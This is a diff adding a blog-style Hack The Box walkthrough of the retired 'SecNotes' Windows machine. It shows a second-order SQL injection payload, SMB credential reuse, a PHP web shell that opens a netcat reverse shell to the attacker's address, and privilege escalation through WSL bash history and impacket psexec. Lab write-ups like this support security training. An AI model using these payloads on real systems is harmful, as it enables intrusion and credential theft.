@@ -1,0 +1,94 @@
+<hr />
+
+<h2 id="quick-summary">Quick Summary</h2>
+<p><br /> Hey guys Today SecNotes retired. SecNotes was a very nice box and I really liked that it mixed between windows and linux , and that’s because it was a windows box and it had windows subsystem for linux (WSL) installed.It was relatively easy. It’s ip is 10.10.10.97 so let’s jump right in.
+<img src="/images/hackthebox/secnotes/0.png" alt="" /></p>
+<hr />
+
+<h2 id="nmap">Nmap</h2>
+<p><br /> We will start with scanning open ports and services with nmap like we always do so <code class="highlighter-rouge">nmap -sV -sT secnotes.htb</code>
+<img src="/images/hackthebox/secnotes/1.png" alt="" />
+<br /> And we see http on port 80 and microsoft-ds on 445 which is smb actually.
+<br /> So let’s look at what’s there on http
+<br /></p>
+<h2 id="http">HTTP</h2>
+<p><img src="/images/hackthebox/secnotes/2.png" alt="" />
+<br /> A regular login page and there is an option to sign up , So let’s sign up and see what’s in there.
+<img src="/images/hackthebox/secnotes/3.png" alt="" />
+<img src="/images/hackthebox/secnotes/4.png" alt="" />
+<br /> After we login we see this regular page : “Viewing Secure Notes for <em>Username</em>” , and there are some options like creating a note , changing password , sign out and contact. Of course we will do regular enumeration like checking for directories ,checking web vulnerabilities and stuff like that but i will just jump into the thing.
+<br /></p>
+<hr />
+
+<h2 id="sqli">SQLI</h2>
+<p><br /> If we tried to do sql injection in the registration form , it will work after we login (second order sqli). A simple payload like <code class="highlighter-rouge">OR 1 OR</code> :
+<img src="/images/hackthebox/secnotes/5.png" alt="" />
+<img src="/images/hackthebox/secnotes/6.png" alt="" />
+<br /> And after we login we see some notes , most importantly “new site” :
+<img src="/images/hackthebox/secnotes/7.png" alt="" />
+<br /> We got smb creds , so the next step is to login with smbclient
+<br /></p>
+<hr />
+
+<h2 id="new-site">New Site</h2>
+<p><br /> We will login with smbclient :
+<code class="highlighter-rouge">smbclient //secnotes.htb/new-site -U "tyler"</code>
+<br /> Then we will look at the contents of that share with <code class="highlighter-rouge">ls</code></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: \&gt; ls
+  .                                   D        0  Fri Jan 18 15:25:52 2019
+  ..                                  D        0  Fri Jan 18 15:25:52 2019
+  iisstart.htm                        A      696  Thu Jun 21 17:26:03 2018
+  iisstart.png                        A    98757  Thu Jun 21 17:26:03 2018
+  Microsoft                           D        0  Fri Jan 18 15:25:52 2019
+
+</code></pre></div></div>
+<p><br /> We see stuff that is related to an http server , but that’s not the server on port 80 , because it had more than just a png picture and html page. If we do another full port scan we will find an http server on port 8808.
+<br /> you can do a full scan by specifying the port range like this <code class="highlighter-rouge">-p-</code> I already know it’s port 8808 so i’m going to scan that port
+<img src="/images/hackthebox/secnotes/8.png" alt="" />
+<br /> Now if we go to that port we will see a default page :
+<img src="/images/hackthebox/secnotes/9.png" alt="" />
+<br /> And by looking at the source we see the png image we saw earlier on the smb share.
+<img src="/images/hackthebox/secnotes/10.png" alt="" />
+<br /> So we can upload our shell to that server through smb then easily get a reverse shell.
+<br /></p>
+<hr />
+
+<h2 id="reverse-shell-and-user">Reverse shell and User</h2>
+<p><br /> We will create a simple php file that executes nc.exe and connects back to us :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
+system('nc.exe -e cmd.exe 10.10.xx.xx 1337')
+?&gt;
+</code></pre></div></div>
+<p><br /> Then we will put it on the server : from smb shell we do <code class="highlighter-rouge">put rev.php</code> we also need nc.exe . you can get it from <a href="https://eternallybored.org/misc/netcat/">here</a> then we will do <code class="highlighter-rouge">put nc.exe</code>
+<br /> Now when we visit secnotes.htb:8808/rev.php our listener should get a callback , and we got a rev shell !
+<img src="/images/hackthebox/secnotes/11.png" alt="" /></p>
+<hr />
+
+<h2 id="wsl">WSL</h2>
+<p><br /> Let’s take a look at the admin’s Desktop
+<img src="/images/hackthebox/secnotes/12.png" alt="" />
+<br /> There are some interesting stuff , but <code class="highlighter-rouge">bash.lnk</code> that’s weird because we are on a windows machine , so windows subsystem for linux is installed on this machine. Let’s find where is bash.exe
+<br /> We will <code class="highlighter-rouge">cd /windows</code> then we will do <code class="highlighter-rouge">dir *.exe /b/s | findstr bash</code> and this will list recursively all the exe files then we will just pick the line that has bash in it , <code class="highlighter-rouge">findstr</code> is like <code class="highlighter-rouge">grep</code> in linux
+<img src="/images/hackthebox/secnotes/13.png" alt="" />
+<br /> And we got the path , let’s <code class="highlighter-rouge">cd</code> to it and execute bash.exe
+<img src="/images/hackthebox/secnotes/14.png" alt="" />
+<br /> We will get a stable shell with python pty , We see that we are root on this subsystem. if we list the files in <code class="highlighter-rouge">/root</code> directory we don’t see too much files , but we see <code class="highlighter-rouge">.bash_history</code> which is a very interesting thing to look at if you are enumerating a linux box so let’s view that.
+<img src="/images/hackthebox/secnotes/15.png" alt="" /></p>
+<hr />
+
+<h2 id="root">Root</h2>
+<p><br /> There’s an smbclient command with the administrator creds, we will simply use <a href="https://github.com/SecureAuthCorp/impacket">impacket</a>’s <code class="highlighter-rouge">psexec.py</code> to get a root shell , like we did in <a href="/hack-the-box/active/">Active</a> 
+<code class="highlighter-rouge">./psexec.py administrator@secnotes.htb</code>
+<img src="/images/hackthebox/secnotes/16.png" alt="" />
+<br /> And we owned root!
+<br />
+<br />
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> previous Hack The Box write-up : <a href="/hack-the-box/oz/">Hack The Box - Oz</a>
+<br /> next Hack The Box write-up : <a href="/hack-the-box/dab/">Hack The Box - Dab</a></p>
+<hr />
+
